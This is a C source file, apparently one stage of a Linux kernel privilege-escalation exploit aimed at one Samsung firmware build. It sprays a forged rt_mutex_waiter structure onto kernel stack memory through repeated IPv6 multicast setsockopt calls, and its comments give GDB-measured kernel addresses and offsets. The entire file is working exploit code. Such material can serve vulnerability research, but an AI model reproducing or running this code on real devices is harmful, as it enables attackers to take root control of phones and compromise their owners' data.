/*
 * exp32 stack stamper — S908BXXSMGZB2 target override.
 *
 * S908BXXSMGZB2 geometry:
 *   rt_waiter is at stack buffer +0x68 (live GDB measured: 0xffffffc00ac7bc70 vs gr32 0xffffffc00ac7bc08).
 *   stale rt_mutex_waiter starts at buffer + 0x68.
 */
#define _GNU_SOURCE

#include <errno.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include "kernelsnitch/utils.h"

#ifndef pr_debug
#define pr_debug(fmt, ...) ((void)0)
#endif

extern atomic_int g_consumer_go;

/* S908BXXSMGZB2: stale rt_waiter lands at stamp-buffer +0x68 (live GDB measured). */
#define EXP32_STAMP_OFF 0x68
/* v5.10 rt_mutex_waiter = 80 bytes */
#define EXP32_WAITER_BYTES 0x50
/* Enough stamps to be sure the full payload is what the last completed
 * call left on the stack; after the loop we never enter the kernel again. */
#define EXP32_STAMP_ROUNDS 64

void do_stamp_stack(uint64_t *buf){
    int fd = socket(AF_INET6, SOCK_DGRAM, 0);
    uint8_t buffer[260];
    if (fd < 0) {
        pr_warning("do_stamp_stack: socket failed errno=%d\n", errno);
        _exit(1);   /* let the parent retry with a fresh child */
    }
    memcpy(buffer + EXP32_STAMP_OFF, buf, EXP32_WAITER_BYTES);

    errno = 0;
    {
        int rc = setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP,
                            buffer, 260);
        if (rc != 0 && errno == EACCES)
            pr_warning("stamp probe: EACCES — denied BEFORE the copy, "
                       "payload will NOT land\n");
        else if (rc != 0)
            pr_info("stamp probe: rc=%d errno=%d — late validation, "
                    "copy done (stamp lands)\n", rc, errno);
        else
            pr_info("stamp probe: setsockopt succeeded\n");
    }

    for (int i = 0; i < EXP32_STAMP_ROUNDS; i++)
        setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, buffer, 260);

    /* Payload is parked: from here on this thread makes NO syscalls, so
     * nothing memsets or overwrites the waiter region again. */
    atomic_store(&g_consumer_go, 1);
    for (;;)
        __asm__ volatile("nop" ::: "memory");
}
